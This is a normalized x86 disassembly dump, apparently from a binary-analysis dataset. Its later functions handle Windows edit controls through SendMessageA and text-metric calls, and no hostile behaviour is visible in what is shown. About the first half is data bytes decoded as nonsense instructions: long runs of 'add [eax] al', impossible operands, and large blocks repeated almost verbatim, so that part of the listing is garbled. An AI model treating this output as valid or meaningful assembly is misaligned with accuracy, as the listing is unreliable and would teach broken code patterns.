add al bh
add [ eax ] al
jo r-xdata
adc [ eax ] al
js r-xdata
push eax
jo r-xdata
jb r-xdata
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
cmp eax [ ecx ]
clc
add [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ edx ] cl
dec edi
outsb
inc esp
jb r-xdata
jae r-xdata
jb r-xdata
cmp eax [ ecx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
js r-xdata
add bh bh
jae r-xdata
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ ecx ] 0xb
dec edi
jae r-xdata
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] eax
or [ edi + 0x61 ] dl
outsb
je r-xdata
add bh bh
add [ eax ] 0x0
add [ eax + 0x4f090045 ] al
inc ebp
jae r-xdata
inc esp
outsd
ja r-xdata
cmp eax [ ecx ]
in al 0x71
inc ebx
jae r-xdata
outsb
je r-xdata
inc ebp
jno r-xdata
dec ebx
jns r-xdata
insb
cmp eax [ ecx ]
[ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
[ eax ]
popad
bound esi [ ebx ]
adc [ eax ] al
jbe r-xdata
retn 0x42
push ebp
outsb
dec ebp
outsd
jne r-xdata
add [ ebp ] 0x9
dec edi
jb r-xdata
add [ edi ] 0xb
dec ebp
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb dl al
inc edx
add [ eax + eax ] bl
add [ eax ] al
and al 0x46
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
jo r-xdata
push ebp
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
insb
jb r-xdata
jl r-xdata
add bh bh
add [ eax ] al
sub al 0xc2
jne r-xdata
cmp eax [ ecx ]
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al

in al dx
jb r-xdata
dec edi
push eax
jo r-xdata
popad
je r-xdata
xor [ edx + 0x43 ] dh
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003e ] al
outsb
dec ebx
jns r-xdata
outsd
arpl [ ebx - 0x64 ] bp
jae r-xdata
add al ah
add [ eax ] al
jmp eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
outsd
arpl [ ebx + 0x54 ] bp
jae r-xdata
dec esp
popad
jbe r-xdata
int3
inc esp
jb r-xdata
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
insb
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
dec edi
outsb
push edi
jb r-xdata
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] bl
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
outsb
push ebx
je r-xdata
dec edi
enter 0x4370 0x0
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jge r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ bx + si ]
cwde
rol [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 ] ch
jo r-xdata
add [ eax + edi * 2 + 0x41 ] cl
add [ esi + ebp * 2 + 0x7aa40041 ] ch
inc ecx
add [ ecx + edi * 2 + 0x41 ] bh
add ah ch
popad
outsd
jbe r-xdata
dec ebp
cmp [ eax - 0x7f3bffbf ] al
inc ecx
add [ eax - 0x5bffbe7f ] bl
int3
add [ ebx + ecx * 8 + 0x42 ] bh
add [ eax ] dl
jle r-xdata
cmp eax [ ecx ]
pushad
add al [ eax ]
jmp [ eax + 0x2 ]
cwde
add [ ecx ] sub_42cca4
int3
add [ eax + 0x300042ce ] ah
sub_42be09
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
[ eax ]
popad
bound esi [ ebx ]
adc [ eax ] al
jbe r-xdata
jl r-xdata
add bh bh
jae r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
adc [ eax ] al
js r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push edi
jb r-xdata
js r-xdata
add bh bh
add [ eax ] al
add [ eax + 0x4f0a0038 ] al
outsb
inc esp
jb r-xdata
js r-xdata
jo r-xdata
xor [ eax ] eax
or [ edi + 0x61 ] dl
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
add [ eax ] al
dec edi
jbe r-xdata
pushfd
push eax
outsd
jo r-xdata
jo r-xdata
cmp eax [ ecx ]
pushad
add al [ eax ]
jmp [ eax + 0x2 ]
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f07003b ] al
popad
add al bh
add [ eax ] al
jb r-xdata
cmp eax [ ecx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
push eax
jo r-xdata
jb r-xdata
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003f ] al
cmp eax [ ecx ]
clc
add [ eax ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : edx ] cl
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ edx ] cl
dec edi
outsb
inc esp
jb r-xdata
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jae r-xdata
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
outsb
dec ebp
outsd
jne r-xdata
add [ ecx ] 0xb
dec edi
jae r-xdata
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jo r-xdata
dec ebx
jns r-xdata
insb
cmp eax [ ecx ]
[ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090045 ] al
inc ebp
jae r-xdata
inc esp
outsd
ja r-xdata
cmp eax [ ecx ]
in al 0x71
inc ebx
jae r-xdata
outsb
je r-xdata
inc ebp
jno r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
insb
jb r-xdata
retn 0x42
push ebp
outsb
dec ebp
outsd
jne r-xdata
add [ ebp ] 0x9
dec edi
jb r-xdata
add [ edi ] 0xb
dec ebp
insb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb dl al
inc edx
add [ eax + eax ] bl
add [ eax ] al
and al 0x46
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
jo r-xdata
push ebp
add [ eax ] ch
add [ eax ] eax
[ eax ]
popad
je r-xdata
xor [ edx + 0x43 ] dh
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003e ] al
outsb
dec ebx
jns r-xdata
outsd
arpl [ ebx - 0x64 ] bp
jae r-xdata
add al ah
add [ eax ] al
jmp eax
add [ eax ] al
sub al 0xc2
jne r-xdata
cmp eax [ ecx ]
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al

in al dx
jb r-xdata
dec edi
push eax
jo r-xdata
inc ebx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
insb
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
outsd
arpl [ ebx + 0x54 ] bp
jae r-xdata
dec esp
popad
jbe r-xdata
int3
inc esp
jb r-xdata
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
jb r-xdata
add [ eax ] al
add [ eax ] bl
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
outsb
push ebx
je r-xdata
dec edi
enter 0x4370 0x0
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
jge r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lea eax [ bx + si ]
cwde
rol [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 ] ch
add [ eax + edi * 2 + 0x41 ] cl
add [ esi + ebp * 2 + 0x7aa40041 ] ch
inc ecx
add [ ecx + edi * 2 + 0x41 ] bh
add ah ch
popad
outsd
jbe r-xdata
dec ebp
cmp [ eax - 0x7f3bffbf ] al
inc ecx
add [ eax - 0x5bffbe7f ] bl
int3
add [ ebx + ecx * 8 + 0x42 ] bh
add [ eax ] dl
jle r-xdata
cwde
add [ ecx ] sub_42cca4
int3
add [ eax + 0x300042ce ] ah
sub_42c250
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43edc4
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
mov edx 0x79
mov eax esi
call sub_43b830
mov edx 0x19
mov eax esi
call sub_43b864
mov dl 0x1
mov eax esi
call sub_443eb8
xor edx edx
mov eax esi
call sub_43c30c
mov [ esi + 0x254 ] 0x1
mov [ esi + 0x257 ] 0x1
mov [ esi + 0x258 ] 0x1
mov [ esi + 0x259 ] 0x1
mov eax esi
call sub_42c92c
mov [ esi + 0x268 ] 0xffffffff
mov [ esi + 0x26c ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
sub_42c30c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xc5
mov eax ebx
call sub_443be8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42c378
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x250 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x250 ] esi
mov eax ebx
call sub_443f88
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd8 ]
sub_42c3bc
push ebx
push esi
mov esi eax
movzx ebx [ esi + 0x25d ]
mov eax esi
call sub_443f88
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb8
mov eax esi
call sub_443be8
push eax
call SendMessageA
test eax eax
setne bl
sub_42c3f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_443f88
test al al
je r-xdata
mov [ esi + 0x25d ] bl
pop esi
pop ebx
retn
push 0x0
movzx eax bl
push eax
push 0xb9
mov eax esi
call sub_443be8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42c42c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x256 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x256 ] bl
mov eax esi
call sub_443f88
test al al
je r-xdata
push 0x0
movzx eax bl
push eax
push 0xcf
mov eax esi
call sub_443be8
push eax
call SendMessageA
sub_42c468
push ebx
push ecx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_443be8
push eax
call SendMessageA
mov eax [ esp ]
pop edx
pop ebx
retn
sub_42c48c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_443be8
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_42c4ac
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_443be8
push eax
call SendMessageA
mov eax [ esp + 0x4 ]
sub eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42c4dc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb0
mov eax ebx
call sub_443be8
push eax
call SendMessageA
add esi [ esp ]
mov [ esp + 0x4 ] esi
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0xb1
mov eax ebx
call sub_443be8
push eax
call SendMessageA
push 0x0
push 0x0
push 0xb7
mov eax ebx
call sub_443be8
push eax
call SendMessageA
pop ecx
pop edx
pop esi
pop ebx
retn
sub_42c578
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_43c0b8
inc eax
call sub_40a530
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42c602
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_40a544
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_43c0c8
cmp edi [ ebp - 0x8 ]
jg r-xdata
mov edx [ ebp - 0xc ]
add edx esi
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40a37c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c609
mov eax [ ebp - 0xc ]
call sub_40a57c
retn
dec edi
mov [ ebp - 0x8 ] edi
sub_42c614
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
mov [ ebp - 0x8 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi eax
mov eax edi
mov ecx esi
xor edx edx
call sub_404f34
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
call sub_43c0b8
inc eax
call sub_40a530
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c6a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40a544
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43c0c8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add eax edx
mov edx [ edi ]
mov ecx esi
call sub_402f9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40a57c
retn
sub_42c6b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440104
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_440030
mov eax [ esi + 0x4 ]
or eax 0xc0
movzx edx [ ebx + 0x254 ]
or eax [ edx * 4 + rw-data ]
cmp [ ebx + 0x255 ] 0x0
setne dl
and edx 0x7f
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x256 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x25b ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x259 ]
or eax [ edx * 4 + rw-data ]
movzx edx [ ebx + 0x25a ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1d9 ] 0x0
je r-xdata
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_42c765
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffff74
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax ebx
call sub_440400
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ edx + 0x5 ] 0x8
je r-xdata
mov esi edx
mov edi esp
mov ecx 0x23
[ edi ] [ esi ]
and [ esp + 0x4 ] 0xfffff7ff
mov edx esp
mov eax ebx
call sub_440400
mov eax [ ebx + 0x1b4 ]
test eax eax
je r-xdata
add esp 0x8c
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push eax
call SendMessageA
jmp r-xdata
sub_42c7d8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
xor eax eax
push ebp
push sub_42c817
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_440230
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c81e
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
retn
sub_42c81e
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x25d ]
mov eax [ ebp - 0x4 ]
call sub_42c3f4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x255 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
cmp eax 0xffffffff
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x255 ]
push eax
push 0xcc
mov eax [ ebp - 0x4 ]
call sub_443be8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
cmp eax 0xffffffff
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xec ]
mov eax [ ebp - 0x4 ]
call sub_42c8f0
pop ecx
pop ebp
retn
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe8 ]
sub_42c8b4
push ebx
mov ebx eax
mov eax ebx
call sub_42c3bc
mov [ ebx + 0x25d ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ ebx + 0x268 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe0 ]
mov [ ebx + 0x26c ] eax
mov eax ebx
call sub_44061c
pop ebx
retn
sub_42c8f0
push ebx
mov ebx eax
cmp [ ebx + 0x257 ] 0x0
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
pop ebx
retn
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_42c92c
pop ebx
retn
sub_42c92c
push ebx
push esi
push edi
add esp 0xffffff90
mov esi eax
push 0x0
call GetDC
mov ebx eax
push esp
push ebx
call GetTextMetricsA
mov eax [ esi + 0x68 ]
call sub_42364c
push eax
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x38 ]
push eax
push ebx
call GetTextMetricsA
push edi
push ebx
call SelectObject
push ebx
push 0x0
call ReleaseDC
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov ebx [ esp ]
mov eax [ esp + 0x38 ]
cmp ebx eax
jle r-xdata
cmp [ esi + 0x1d9 ] 0x0
je r-xdata
push 0x6
call GetSystemMetrics
add eax eax
add eax eax
test ebx ebx
jns r-xdata
mov ebx eax
mov ebx 0x6
mov ebx 0x8
jmp r-xdata
sar ebx 0x2
add eax ebx
mov ebx eax
add ebx 0x3
mov edx [ esp + 0x38 ]
add edx ebx
mov eax esi
call sub_43b864
add esp 0x70
pop edi
pop esi
pop ebx
retn
push 0x6
call GetSystemMetrics
imul ebx eax
jmp r-xdata
sub_42c9f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0x7
jne r-xdata
mov edx ebx
mov eax esi
call sub_44145c
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
jne r-xdata
xor eax eax
mov [ ebx + 0x4 ] eax
sub_42ca30
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_443be8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_443be8
push eax
call SendMessageA
sub_42ca70
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4431d0
pop esi
pop ebx
retn
cmp [ ebx + 0x254 ] 0x1
jne r-xdata
mov eax ebx
call sub_42c8f0
mov eax ebx
call sub_4408ec
sub_42caa4
push ebx
mov ebx eax
mov eax ebx
call sub_443114
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_42c92c
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_42caec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x258 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_442f6c
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_443be8
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_42c55c
sub_42cb28
push esi
mov esi eax
mov eax esi
call sub_444ff0
mov eax esi
call sub_443f88
test al al
je r-xdata
mov eax esi
mov si 0xffb0
call sub_404160
push 0xfffffff0
mov eax esi
call sub_443be8
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_42cb60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
mov edx esi
mov eax ebx
call sub_444e58
pop esi
pop ebx
retn
sub_42cb7c
push ebx
push esi
mov ebx eax
xor esi esi
mov eax [ ebx + 0x18 ]
call sub_443f88
test al al
jne r-xdata
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
push eax
push 0xc1
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_42cbec
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov ecx eax
mov edx esp
mov eax edi
call sub_404f34
add esp 0x1000
pop edi
pop esi
pop ebx
retn
sub_42cc30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
add eax esi
push eax
push esi
push 0xb1
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov eax edi
call sub_405324
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
sub_42cca4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42cd8f
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cd96
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
push 0x0
push edi
push 0xbb
mov eax [ esi + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
push 0x0
dec edi
push edi
push 0xbb
mov eax [ esi + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx [ ebp - 0x8 ]
call sub_405170
jmp r-xdata
push 0x0
push ebx
push 0xc1
mov eax [ esi + 0x18 ]
call sub_443be8
push eax
call SendMessageA
test eax eax
je r-xdata
push ebx
push ebx
push 0xb1
mov eax [ esi + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push 0x0
push 0xc2
mov eax [ esi + 0x18 ]
call sub_443be8
push eax
call SendMessageA
add ebx eax
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx r-xdata
call sub_405170
sub_42cda3
inc [ edx ]
add [ eax ] al
add [ 0xa ] cl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
push 0x0
push edi
push 0xbb
mov eax [ ebx + 0x18 ]
call sub_443be8
push eax
call SendMessageA
mov esi eax
